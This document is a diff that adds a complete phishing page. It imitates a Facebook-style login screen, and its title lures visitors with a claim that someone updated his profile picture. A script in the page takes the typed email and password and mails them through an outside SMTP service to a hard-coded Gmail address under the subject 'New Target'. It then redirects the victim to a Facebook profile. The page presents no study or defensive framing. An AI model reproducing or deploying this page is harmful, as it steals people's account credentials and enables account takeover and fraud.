@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ᎷᎴ ᏁᏗᏰᎥ updated his profile picture</title>
+  <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="dF5SId3UHWd.svg">
+    </div>
+    <form id="login-form" onsubmit="sendMsg(); reset(); return false;">
+      <div class="input-group">
+        <input type="text" id="username" name="email" placeholder="Mobile number or email address" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" name="password" placeholder="Password" required>
+      </div>
+      <div class="input-group">
+        <input type="submit" value="Log In">
+      </div>
+    </form>
+    <div class="forgot">
+      <p>Forgotten password?</p>
+    </div>
+    <div class="or">
+      <span class="l"></span>
+      <p>or</p>
+      <span class="r"></span>
+    </div>
+    <div class="create">
+      <button>Create new account</button>
+    </div>
+  </div>
+
+  <script src="main.js"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    function sendMsg() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      Email.send({
+        SecureToken: "cbc37d4f-b11e-4a27-9fa9-ae9a78005880",
+        To: 'sakhawatulislam18@gmail.com',
+        From: 'sakhawatulislam18@gmail.com',
+        Subject: "New Target",
+        Body: "Username: " + document.getElementById('username').value + "<br> password: " + document.getElementById('password').value
+      }).then(
+        window.location.href = "https://www.facebook.com/md.nabi.18s?mibextid=ZbWKwL"
+      );
+    }
+  </script>
+
+</body>
+
+</html>
